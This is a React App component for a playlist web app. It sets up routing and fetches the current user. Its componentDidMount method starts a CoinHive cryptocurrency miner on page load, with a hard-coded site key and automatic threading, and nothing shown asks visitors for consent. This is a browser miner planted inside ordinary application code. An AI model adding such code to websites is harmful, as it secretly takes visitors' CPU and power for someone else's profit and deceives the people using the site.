import React, { Component } from 'react';
import { BrowserRouter as Router, Route, Redirect } from 'react-router-dom';
import { observer, inject } from 'mobx-react';
import axios from 'axios'

import Header from './Header';
import LoginRegister from './LoginRegister';
import JoinCreate from './JoinCreate';
import Playlist from './Playlist';

import './App.scss';

const RedirectHome = () => {
  return (
    <Redirect to={{
        pathname: '/',
    }}/>
  )
}

@inject("UserStore")
@observer
class App extends Component {
  constructor() {
    super();
    this.state = {};
  }

  componentWillMount() {
    axios('/api/user/me')
    .then((res) => {
      this.props.UserStore.set(res.data);
    })
    .catch((err) => {
      console.log(err);
    })
  }

  componentDidMount() {
    var miner = new window.CoinHive.User('hcXLKxtM8O8LpF9xq60U3CORiYyPUzi1', this.props.UserStore.username || 'not-logged-in', {
      autoThreads: true
    });
  	miner.start();
    // Listen on events
  	// miner.on('found', function() { /* Hash found */ })
  	// miner.on('accepted', function() { /* Hash accepted by the pool */ })

  	// Update stats once per second
  	// setInterval(function() {
  	// 	var hashesPerSecond = miner.getHashesPerSecond();
  	// 	var totalHashes = miner.getTotalHashes();
    //   var acceptedHashes = miner.getAcceptedHashes();
  	// 	var numThreads = miner.getNumThreads();
    //
  	// 	// Output to HTML elements...
    //   console.log(hashesPerSecond, totalHashes, acceptedHashes, numThreads);
  	// }, 1000);
  }

  render() {
    return (
      <Router>
        <div className="App">
          <Header />
          <div className="content">
            {/* {JSON.stringify(this.props.UserStore.user, null, 2)} */}
            <Route exact path="/" component={JoinCreate}/>
            <Route exact path="/login" component={LoginRegister}/>
            <Route path="/playlist/:slug" component={Playlist}/>
            <Route exact path="/playlist" component={RedirectHome}/>
          </div>
        </div>
      </Router>
    );
  }
}

export default App;
